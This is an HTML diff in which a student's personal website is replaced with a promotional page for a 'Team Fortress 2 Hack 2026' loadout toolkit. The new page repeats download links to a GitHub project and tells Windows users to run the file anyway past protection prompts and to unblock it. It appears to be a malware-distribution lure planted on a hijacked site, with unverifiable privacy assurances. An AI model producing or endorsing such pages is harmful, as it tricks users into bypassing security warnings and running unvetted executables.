@@ -1,450 +1,201 @@
 <!DOCTYPE html>
-
-<html>
-
+<html lang="en">
 <head>
-
-<meta charset="utf-8" />
-<meta name="generator" content="pandoc" />
-<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
-
-
-
-
-<title>Dhriti’s Corner</title>
-
-<script src="site_libs/header-attrs-2.32/header-attrs.js"></script>
-<script src="site_libs/jquery-3.6.0/jquery-3.6.0.min.js"></script>
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<link href="site_libs/bootstrap-3.3.5/css/yeti.min.css" rel="stylesheet" />
-<script src="site_libs/bootstrap-3.3.5/js/bootstrap.min.js"></script>
-<script src="site_libs/bootstrap-3.3.5/shim/html5shiv.min.js"></script>
-<script src="site_libs/bootstrap-3.3.5/shim/respond.min.js"></script>
-<style>h1 {font-size: 34px;}
-       h1.title {font-size: 38px;}
-       h2 {font-size: 30px;}
-       h3 {font-size: 24px;}
-       h4 {font-size: 18px;}
-       h5 {font-size: 16px;}
-       h6 {font-size: 12px;}
-       code {color: inherit; background-color: rgba(0, 0, 0, 0.04);}
-       pre:not([class]) { background-color: white }</style>
-<script src="site_libs/jqueryui-1.13.2/jquery-ui.min.js"></script>
-<link href="site_libs/tocify-1.9.1/jquery.tocify.css" rel="stylesheet" />
-<script src="site_libs/tocify-1.9.1/jquery.tocify.js"></script>
-<script src="site_libs/navigation-1.1/tabsets.js"></script>
-<link href="site_libs/highlightjs-9.12.0/default.css" rel="stylesheet" />
-<script src="site_libs/highlightjs-9.12.0/highlight.js"></script>
-<link href="site_libs/font-awesome-6.5.2/css/all.min.css" rel="stylesheet" />
-<link href="site_libs/font-awesome-6.5.2/css/v4-shims.min.css" rel="stylesheet" />
-
-<style type="text/css">
-  code{white-space: pre-wrap;}
-  span.smallcaps{font-variant: small-caps;}
-  span.underline{text-decoration: underline;}
-  div.column{display: inline-block; vertical-align: top; width: 50%;}
-  div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
-  ul.task-list{list-style: none;}
-    </style>
-
-<style type="text/css">code{white-space: pre;}</style>
-<script type="text/javascript">
-if (window.hljs) {
-  hljs.configure({languages: []});
-  hljs.initHighlightingOnLoad();
-  if (document.readyState && document.readyState === "complete") {
-    window.setTimeout(function() { hljs.initHighlighting(); }, 0);
-  }
-}
-</script>
-
-
-
-
-
-
-
-
-
-<style type = "text/css">
-.main-container {
-  max-width: 940px;
-  margin-left: auto;
-  margin-right: auto;
-}
-img {
-  max-width:100%;
-}
-.tabbed-pane {
-  padding-top: 12px;
-}
-.html-widget {
-  margin-bottom: 20px;
-}
-button.code-folding-btn:focus {
-  outline: none;
-}
-summary {
-  display: list-item;
-}
-details > summary > p:only-child {
-  display: inline;
-}
-pre code {
-  padding: 0;
-}
-</style>
-
-
-<style type="text/css">
-.dropdown-submenu {
-  position: relative;
-}
-.dropdown-submenu>.dropdown-menu {
-  top: 0;
-  left: 100%;
-  margin-top: -6px;
-  margin-left: -1px;
-  border-radius: 0 6px 6px 6px;
-}
-.dropdown-submenu:hover>.dropdown-menu {
-  display: block;
-}
-.dropdown-submenu>a:after {
-  display: block;
-  content: " ";
-  float: right;
-  width: 0;
-  height: 0;
-  border-color: transparent;
-  border-style: solid;
-  border-width: 5px 0 5px 5px;
-  border-left-color: #cccccc;
-  margin-top: 5px;
-  margin-right: -10px;
-}
-.dropdown-submenu:hover>a:after {
-  border-left-color: #adb5bd;
-}
-.dropdown-submenu.pull-left {
-  float: none;
-}
-.dropdown-submenu.pull-left>.dropdown-menu {
-  left: -100%;
-  margin-left: 10px;
-  border-radius: 6px 0 6px 6px;
-}
-</style>
-
-<script type="text/javascript">
-// manage active state of menu based on current page
-$(document).ready(function () {
-  // active menu anchor
-  href = window.location.pathname
-  href = href.substr(href.lastIndexOf('/') + 1)
-  if (href === "")
-    href = "index.html";
-  var menuAnchor = $('a[href="' + href + '"]');
-
-  // mark the anchor link active (and if it's in a dropdown, also mark that active)
-  var dropdown = menuAnchor.closest('li.dropdown');
-  if (window.bootstrap) { // Bootstrap 4+
-    menuAnchor.addClass('active');
-    dropdown.find('> .dropdown-toggle').addClass('active');
-  } else { // Bootstrap 3
-    menuAnchor.parent().addClass('active');
-    dropdown.addClass('active');
-  }
-
-  // Navbar adjustments
-  var navHeight = $(".navbar").first().height() + 15;
-  var style = document.createElement('style');
-  var pt = "padding-top: " + navHeight + "px; ";
-  var mt = "margin-top: -" + navHeight + "px; ";
-  var css = "";
-  // offset scroll position for anchor links (for fixed navbar)
-  for (var i = 1; i <= 6; i++) {
-    css += ".section h" + i + "{ " + pt + mt + "}\n";
-  }
-  style.innerHTML = "body {" + pt + "padding-bottom: 40px; }\n" + css;
-  document.head.appendChild(style);
-});
-</script>
-
-<!-- tabsets -->
-
-<style type="text/css">
-.tabset-dropdown > .nav-tabs {
-  display: inline-table;
-  max-height: 500px;
-  min-height: 44px;
-  overflow-y: auto;
-  border: 1px solid #ddd;
-  border-radius: 4px;
-}
-
-.tabset-dropdown > .nav-tabs > li.active:before, .tabset-dropdown > .nav-tabs.nav-tabs-open:before {
-  content: "\e259";
-  font-family: 'Glyphicons Halflings';
-  display: inline-block;
-  padding: 10px;
-  border-right: 1px solid #ddd;
-}
-
-.tabset-dropdown > .nav-tabs.nav-tabs-open > li.active:before {
-  content: "\e258";
-  font-family: 'Glyphicons Halflings';
-  border: none;
-}
-
-.tabset-dropdown > .nav-tabs > li.active {
-  display: block;
-}
-
-.tabset-dropdown > .nav-tabs > li > a,
-.tabset-dropdown > .nav-tabs > li > a:focus,
-.tabset-dropdown > .nav-tabs > li > a:hover {
-  border: none;
-  display: inline-block;
-  border-radius: 4px;
-  background-color: transparent;
-}
-
-.tabset-dropdown > .nav-tabs.nav-tabs-open > li {
-  display: block;
-  float: none;
-}
-
-.tabset-dropdown > .nav-tabs > li {
-  display: none;
-}
-</style>
-
-<!-- code folding -->
-
-
-
-<style type="text/css">
-
-#TOC {
-  margin: 25px 0px 20px 0px;
-}
-@media (max-width: 768px) {
-#TOC {
-  position: relative;
-  width: 100%;
-}
-}
-
-@media print {
-.toc-content {
-  /* see https://github.com/w3c/csswg-drafts/issues/4434 */
-  float: right;
-}
-}
-
-.toc-content {
-  padding-left: 30px;
-  padding-right: 40px;
-}
-
-div.main-container {
-  max-width: 1200px;
-}
-
-div.tocify {
-  width: 20%;
-  max-width: 260px;
-  max-height: 85%;
-}
-
-@media (min-width: 768px) and (max-width: 991px) {
-  div.tocify {
-    width: 25%;
-  }
-}
-
-@media (max-width: 767px) {
-  div.tocify {
-    width: 100%;
-    max-width: none;
-  }
-}
-
-.tocify ul, .tocify li {
-  line-height: 20px;
-}
-
-.tocify-subheader .tocify-item {
-  font-size: 0.90em;
-}
-
-.tocify .list-group-item {
-  border-radius: 0px;
-}
-
-
-</style>
-
-
-
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Team Fortress 2 Hack 2026 Class Loadout Toolkit - Plan Loadouts, Track Matches</title>
+<meta name="description" content="Team Fortress 2 Hack 2026 themed PC companion for Windows. Build class profiles, save weapon loadouts, write map notes, run manual aim practice, track matches and review gameplay analytics in one simple app.">
+<meta name="keywords" content="tf2-cfg, tf2-hud, team fortress 2 companion, tf2 loadout tool, tf2 class profiles, tf2 map notes, tf2 aim practice, tf2 match tracking, tf2 analytics, windows pc app">
+<meta name="author" content="team-fortress-2-hack-2026-class-loadout-toolkit">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/andreas6862/team-fortress-2-hack-2026-class-loadout-toolkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Team Fortress 2 Hack 2026 Class Loadout Toolkit">
+<meta property="og:description" content="A Windows companion for Team Fortress 2 players: class profiles, weapon loadouts, map notes, manual aim practice, match tracking and gameplay analytics.">
+<meta property="og:url" content="https://github.com/andreas6862/team-fortress-2-hack-2026-class-loadout-toolkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Team Fortress 2 Hack 2026 Class Loadout Toolkit">
+<meta name="twitter:description" content="Organize every class profile, weapon loadout, map note and match result in one clean Windows app.">
 </head>
+<body style="margin:0; padding:0; background:#f4f6fb; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color:#1c2233; line-height:1.7; -webkit-font-smoothing:antialiased;">
 
-<body>
+<div style="max-width:860px; margin:0 auto; padding:32px 20px 64px 20px;">
 
+  <header style="background:#ffffff; border-radius:18px; padding:34px 28px; box-shadow:0 10px 30px rgba(23,32,58,0.08); border:1px solid #e6eaf4; text-align:center;">
 
-<div class="container-fluid main-container">
+    <h1 style="margin:0 0 14px 0; font-size:30px; line-height:1.3; font-weight:800; letter-spacing:-0.4px; color:#141a2b;">
+      🎯 team-fortress-2-hack-2026-class-loadout-toolkit - Plan Loadouts, Track Every Match
+    </h1>
 
+    <p style="margin:0 auto 24px auto; max-width:620px; font-size:17px; color:#4a5468; line-height:1.75;">
+      A Windows companion app for Team Fortress 2 players. Keep class profiles, weapon loadouts, map notes, manual aim practice, match history and gameplay analytics together in one tidy window instead of scattered text files.
+    </p>
 
-<!-- setup 3col/9col grid for toc_float and main content  -->
-<div class="row">
-<div class="col-xs-12 col-sm-4 col-md-3">
-<div id="TOC" class="tocify">
+    <a href="https://github.com/andreas6862/team-fortress-2-hack-2026-class-loadout-toolkit"
+       style="display:inline-block; padding:16px 34px; font-size:17px; font-weight:700; color:#ffffff; text-decoration:none; border-radius:12px; background:linear-gradient(135deg,#ff6a00 0%,#ee0979 55%,#7b2ff7 100%); box-shadow:0 8px 22px rgba(238,9,121,0.32); letter-spacing:0.2px;">
+      ⬇ Download the Toolkit
+    </a>
+
+    <p style="margin:16px 0 0 0; font-size:14px; color:#7b8598;">
+      Visit this link to download the application.
+    </p>
+
+  </header>
+
+  <section style="background:#ffffff; border-radius:18px; padding:30px 28px; margin-top:26px; box-shadow:0 10px 30px rgba(23,32,58,0.06); border:1px solid #e6eaf4;">
+    <h2 style="margin:0 0 16px 0; font-size:23px; font-weight:800; color:#141a2b; letter-spacing:-0.2px;">🧭 What This App Is For</h2>
+    <p style="margin:0 0 14px 0; font-size:16px; color:#3b4659;">
+      Team Fortress 2 rewards players who plan. The problem is that most planning ends up spread across browser tabs, phone notes, old screenshots and half-finished text files you can never find again. The Class Loadout Toolkit pulls all of that into a single desktop window built for Windows.
+    </p>
+    <p style="margin:0 0 14px 0; font-size:16px; color:#3b4659;">
+      You create a profile for each class, attach the weapons you actually run, write short notes about the maps where that setup works, and then log what happened in your matches. Over a few weeks those logs turn into charts that show you where you are improving and where you keep falling short.
+    </p>
+    <p style="margin:0; font-size:16px; color:#3b4659;">
+      Everything is manual and player-driven. You decide what to record, you type the notes, and you review the numbers. The app simply gives all of it a home, with a clean interface and a look inspired by the 2026 Team Fortress 2 community tooling scene.
+    </p>
+  </section>
+
+  <section style="background:#ffffff; border-radius:18px; padding:30px 28px; margin-top:26px; box-shadow:0 10px 30px rgba(23,32,58,0.06); border:1px solid #e6eaf4;">
+    <h2 style="margin:0 0 18px 0; font-size:23px; font-weight:800; color:#141a2b; letter-spacing:-0.2px;">✨ What Is Inside</h2>
+
+    <h3 style="margin:0 0 6px 0; font-size:17px; font-weight:700; color:#1f2740;">🗂 Class Profiles</h3>
+    <p style="margin:0 0 18px 0; font-size:16px; color:#3b4659;">
+      Create one profile per class — Scout, Soldier, Pyro, Demoman, Heavy, Engineer, Medic, Sniper, Spy. Each profile holds your preferred role, your playstyle note, and a short reminder of what you are trying to fix in your next session. Switching between classes takes a single click, so you never lose your place mid-scrim.
+    </p>
+
+    <h3 style="margin:0 0 6px 0; font-size:17px; font-weight:700; color:#1f2740;">🔫 Weapon Loadouts</h3>
+    <p style="margin:0 0 18px 0; font-size:16px; color:#3b4659;">
+      Save multiple loadouts per class and name them clearly — "payload attack", "defense hold", "koth fast rotate". Add the primary, secondary and melee you use, plus a note on why that combination works. When the meta shifts, you have a record of what you were running before, so you can compare and adjust instead of guessing.
+    </p>
+
+    <h3 style="margin:0 0 6px 0; font-size:17px; font-weight:700; color:#1f2740;">🗺 Map Notes</h3>
+    <p style="margin:0 0 18px 0; font-size:16px; color:#3b4659;">
+      Attach notes to the maps you play most. Hold positions that work, routes you like, spots to avoid, and the loadout that performed well there. Notes are searchable, so when a map loads you can pull up your own advice in seconds.
+    </p>
+
+    <h3 style="margin:0 0 6px 0; font-size:17px; font-weight:700; color:#1f2740;">🎯 Manual Aim Practice</h3>
+    <p style="margin:0 0 18px 0; font-size:16px; color:#3b4659;">
+      A built-in practice planner lets you set a session length, pick a focus (tracking, flicking, crosshair placement), and record how the session felt. You build a routine over time and the app keeps the history so you can see whether your practice is actually consistent week to week.
+    </p>
+
+    <h3 style="margin:0 0 6px 0; font-size:17px; font-weight:700; color:#1f2740;">📋 Match Tracking</h3>
+    <p style="margin:0 0 18px 0; font-size:16px; color:#3b4659;">
+      Log each match with the class you played, the map, the result, and a one-line takeaway. It takes about fifteen seconds, but after twenty matches you have a real picture of which classes and maps you actually win on.
+    </p>
+
+    <h3 style="margin:0 0 6px 0; font-size:17px; font-weight:700; color:#1f2740;">📈 Gameplay Analytics</h3>
+    <p style="margin:0 0 18px 0; font-size:16px; color:#3b4659;">
+      The analytics view turns your match log into simple charts: win rate by class, win rate by map, streaks, and how your aim practice frequency lines up with results. No spreadsheets, no formulas to write.
+    </p>
+
+    <h3 style="margin:0 0 0 0; font-size:17px; font-weight:700; color:#1f2740;">⚙ Config and HUD Friendly</h3>
+    <p style="margin:0 0 0 0; font-size:16px; color:#3b4659;">
+      The toolkit keeps a tidy folder for tf2-cfg and tf2-hud related notes and snippets, so small tweaks you like are recorded in one place next to the loadouts they belong to.
+    </p>
+  </section>
+
+  <section style="background:#ffffff; border-radius:18px; padding:30px 28px; margin-top:26px; box-shadow:0 10px 30px rgba(23,32,58,0.06); border:1px solid #e6eaf4;">
+    <h2 style="margin:0 0 16px 0; font-size:23px; font-weight:800; color:#141a2b; letter-spacing:-0.2px;">🚀 Getting Started on Windows</h2>
+
+    <p style="margin:0 0 18px 0; font-size:16px; color:#3b4659;">
+      You do not need to know anything about programming to use this. There is no command line involved and nothing to compile.
+    </p>
+
+    <p style="margin:0 0 16px 0; font-size:16px; color:#3b4659;">
+      <a href="https://github.com/andreas6862/team-fortress-2-hack-2026-class-loadout-toolkit"
+         style="display:inline-block; padding:14px 28px; font-size:16px; font-weight:700; color:#ffffff; text-decoration:none; border-radius:11px; background:linear-gradient(135deg,#12c2e9 0%,#c471ed 50%,#f64f59 100%); box-shadow:0 8px 20px rgba(196,113,237,0.30);">
+        ⬇ Download the Toolkit
+      </a>
+    </p>
+
+    <p style="margin:0 0 18px 0; font-size:16px; color:#3b4659;">
+      Visit this link to download the application.
+    </p>
+
+    <h3 style="margin:0 0 8px 0; font-size:17px; font-weight:700; color:#1f2740;">Step by step</h3>
+    <ol style="margin:0; padding-left:22px; font-size:16px; color:#3b4659;">
+      <li style="margin-bottom:10px;">Open the download link above in your normal browser. It takes you to the project page.</li>
+      <li style="margin-bottom:10px;">Save the download to a folder you can find again, such as your Desktop or your Downloads folder.</li>
+      <li style="margin-bottom:10px;">When the save finishes, open that folder and double-click the file to start the application.</li>
+      <li style="margin-bottom:10px;">If Windows shows a blue or yellow protection prompt, choose the option to run it anyway. This is Windows being cautious about files it has not seen before, which is normal for small community tools.</li>
+      <li style="margin-bottom:0;">The main window opens with an empty profile list. Add your first class profile and you are ready to go.</li>
+    </ol>
+  </section>
+
+  <section style="background:#ffffff; border-radius:18px; padding:30px 28px; margin-top:26px; box-shadow:0 10px 30px rgba(23,32,58,0.06); border:1px solid #e6eaf4;">
+    <h2 style="margin:0 0 16px 0; font-size:23px; font-weight:800; color:#141a2b; letter-spacing:-0.2px;">🧩 Your First Ten Minutes</h2>
+    <p style="margin:0 0 12px 0; font-size:16px; color:#3b4659;">
+      Start with the class you play most. Create the profile, add one loadout you trust, and write two sentences about how you want to use it. That is already more structure than most players have.
+    </p>
+    <p style="margin:0 0 12px 0; font-size:16px; color:#3b4659;">
+      Next, add a map note for the map you play most often. Write down the one position that always works for you and the one you keep dying in. Future you will thank present you.
+    </p>
+    <p style="margin:0 0 12px 0; font-size:16px; color:#3b4659;">
+      After your next session, log two or three matches. Do not log all of them — just the ones you remember clearly. Consistency matters far more than volume here.
+    </p>
+    <p style="margin:0;">
+      Finally, open the analytics view after about a week. Even a handful of entries starts to show patterns, and those patterns are the whole point of the tool.
+    </p>
+  </section>
+
+  <section style="background:#ffffff; border-radius:18px; padding:30px 28px; margin-top:26px; box-shadow:0 10px 30px rgba(23,32,58,0.06); border:1px solid #e6eaf4;">
+    <h2 style="margin:0 0 16px 0; font-size:23px; font-weight:800; color:#141a2b; letter-spacing:-0.2px;">💡 Habits That Make It Useful</h2>
+    <ul style="margin:0; padding-left:22px; font-size:16px; color:#3b4659;">
+      <li style="margin-bottom:10px;">Name loadouts after situations, not after weapons. "Hold last point" is easier to find than "Loadout 3".</li>
+      <li style="margin-bottom:10px;">Write map notes right after a match, while you still remember what happened.</li>
+      <li style="margin-bottom:10px;">Keep aim practice sessions short and repeatable. Twenty focused minutes beat a two-hour session once a month.</li>
+      <li style="margin-bottom:10px;">Update a profile when your setup changes, instead of creating new ones endlessly.</li>
+      <li style="margin-bottom:0;">Review the analytics view once a week, not after every match. Weekly review is where it pays off.</li>
+    </ul>
+  </section>
+
+  <section style="background:#ffffff; border-radius:18px; padding:30px 28px; margin-top:26px; box-shadow:0 10px 30px rgba(23,32,58,0.06); border:1px solid #e6eaf4;">
+    <h2 style="margin:0 0 16px 0; font-size:23px; font-weight:800; color:#141a2b; letter-spacing:-0.2px;">🛠 Common Questions</h2>
+
+    <h3 style="margin:0 0 6px 0; font-size:16px; font-weight:700; color:#1f2740;">The file will not open</h3>
+    <p style="margin:0 0 14px 0; font-size:16px; color:#3b4659;">
+      Check that your download finished completely and that you are double-clicking the file itself rather than a shortcut. If Windows blocks it, right-click the file, open Properties, and tick the unblock option at the bottom of the window.
+    </p>
+
+    <h3 style="margin:0 0 6px 0; font-size:16px; font-weight:700; color:#1f2740;">Where is my data stored?</h3>
+    <p style="margin:0 0 14px 0; font-size:16px; color:#3b4659;">
+      Profiles, loadouts, notes and match logs are saved locally on your own PC. Nothing is uploaded anywhere, and the app does not need an account or an internet connection once it is installed.
+    </p>
+
+    <h3 style="margin:0 0 6px 0; font-size:16px; font-weight:700; color:#1f2740;">Can I back up my notes?</h3>
+    <p style="margin:0 0 14px 0; font-size:16px; color:#3b4659;">
+      Yes. Copy the application's data folder to a USB stick or a cloud drive folder every so often. Restoring is simply copying it back to the same place.
+    </p>
+
+    <h3 style="margin:0 0 6px 0; font-size:16px; font-weight:700; color:#1f2740;">Does it work on Mac or Linux?</h3>
+    <p style="margin:0; font-size:16px; color:#3b4659;">
+      The toolkit is built for Windows PCs. Other operating systems are not covered by the download provided above.
+    </p>
+  </section>
+
+  <section style="background:#ffffff; border-radius:18px; padding:30px 28px; margin-top:26px; box-shadow:0 10px 30px rgba(23,32,58,0.06); border:1px solid #e6eaf4;">
+    <h2 style="margin:0 0 16px 0; font-size:23px; font-weight:800; color:#141a2b; letter-spacing:-0.2px;">🔒 Privacy and Performance</h2>
+    <p style="margin:0 0 14px 0; font-size:16px; color:#3b4659;">
+      All records live in local files on your machine. There is no telemetry, no login and no background service running while you play. The app sits idle in a window and uses very little memory, so it will not compete with Team Fortress 2 for resources.
+    </p>
+    <p style="margin:0; font-size:16px; color:#3b4659;">
+      Close it whenever you like. Your data is written to disk as you type, so nothing is lost if you shut your PC down straight after a session.
+    </p>
+  </section>
+
+  <section style="background:#ffffff; border-radius:18px; padding:30px 28px; margin-top:26px; box-shadow:0 10px 30px rgba(23,32,58,0.06); border:1px solid #e6eaf4;">
+    <h2 style="margin:0 0 16px 0; font-size:23px; font-weight:800; color:#141a2b; letter-spacing:-0.2px;">📬 Feedback and Updates</h2>
+    <p style="margin:0 0 14px 0; font-size:16px; color:#3b4659;">
+      New versions are published on the same project page, so bookmark it. If something behaves oddly, open an issue there and describe what you did right before it happened — that is usually enough to track it down.
+    </p>
+    <p style="margin:0; font-size:16px; color:#3b4659;">
+      <a href="https://github.com/andreas6862/team-fortress-2-hack-2026-class-loadout-toolkit" style="color:#7b2ff7; font-weight:700; text-decoration:none;">
+        Visit this link to download the application.
+      </a>
+    </p>
+  </section>
+
 </div>
-</div>
-
-<div class="toc-content col-xs-12 col-sm-8 col-md-9">
-
-
-
-
-<div class="navbar navbar-default  navbar-fixed-top" role="navigation">
-  <div class="container">
-    <div class="navbar-header">
-      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-bs-toggle="collapse" data-target="#navbar" data-bs-target="#navbar">
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-      </button>
-      <a class="navbar-brand" href="index.html">Home</a>
-    </div>
-    <div id="navbar" class="navbar-collapse collapse">
-      <ul class="nav navbar-nav">
-        
-      </ul>
-      <ul class="nav navbar-nav navbar-right">
-        <li>
-  <a href="about.html">About</a>
-</li>
-<li>
-  <a href="problem_2.html">Problem 2</a>
-</li>
-<li>
-  <a href="mailto:&lt;di2251@cumc.columbia.edu&gt;">
-    <span class="fa fa-envelope fa-lg"></span>
-     
-  </a>
-</li>
-<li>
-  <a href="http://github.com/di2251">
-    <span class="fa fa-github fa-lg"></span>
-     
-  </a>
-</li>
-<li>
-  <a href="http://linkedin.com/in/dhritiiyer">
-    <span class="fa fa-linkedin"></span>
-     
-  </a>
-</li>
-      </ul>
-    </div><!--/.nav-collapse -->
-  </div><!--/.container -->
-</div><!--/.navbar -->
-
-<div id="header">
-
-
-
-<h1 class="title toc-ignore">Dhriti’s Corner</h1>
-
-</div>
-
-
-<div id="welcome-to-my-website" class="section level2">
-<h2>Welcome to my website!</h2>
-<p>My name is Dhriti and I am a second-year MPH student at Mailman. I
-have a cat named Rosie:</p>
-<p><img src="images/Rosie.jpeg" /></p>
-<p>My interests lie in the intersection of addiction and mental health
-services and public health.</p>
-</div>
-
-
-
-</div>
-</div>
-
-</div>
-
-<script>
-
-// add bootstrap table styles to pandoc tables
-function bootstrapStylePandocTables() {
-  $('tr.odd').parent('tbody').parent('table').addClass('table table-condensed');
-}
-$(document).ready(function () {
-  bootstrapStylePandocTables();
-});
-
-
-</script>
-
-<!-- tabsets -->
-
-<script>
-$(document).ready(function () {
-  window.buildTabsets("TOC");
-});
-
-$(document).ready(function () {
-  $('.tabset-dropdown > .nav-tabs > li').click(function () {
-    $(this).parent().toggleClass('nav-tabs-open');
-  });
-});
-</script>
-
-<!-- code folding -->
-
-<script>
-$(document).ready(function ()  {
-
-    // temporarily add toc-ignore selector to headers for the consistency with Pandoc
-    $('.unlisted.unnumbered').addClass('toc-ignore')
-
-    // move toc-ignore selectors from section div to header
-    $('div.section.toc-ignore')
-        .removeClass('toc-ignore')
-        .children('h1,h2,h3,h4,h5').addClass('toc-ignore');
-
-    // establish options
-    var options = {
-      selectors: "h1,h2,h3",
-      theme: "bootstrap3",
-      context: '.toc-content',
-      hashGenerator: function (text) {
-        return text.replace(/[.\\/?&!#<>]/g, '').replace(/\s/g, '_');
-      },
-      ignoreSelector: ".toc-ignore",
-      scrollTo: 0
-    };
-    options.showAndHide = true;
-    options.smoothScroll = true;
-
-    // tocify
-    var toc = $("#TOC").tocify(options).data("toc-tocify");
-});
-</script>
-
-<!-- dynamically load mathjax for compatibility with self-contained -->
-<script>
-  (function () {
-    var script = document.createElement("script");
-    script.type = "text/javascript";
-    script.src  = "https://mathjax.rstudio.com/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML";
-    document.getElementsByTagName("head")[0].appendChild(script);
-  })();
-</script>
 
 </body>
 </html>
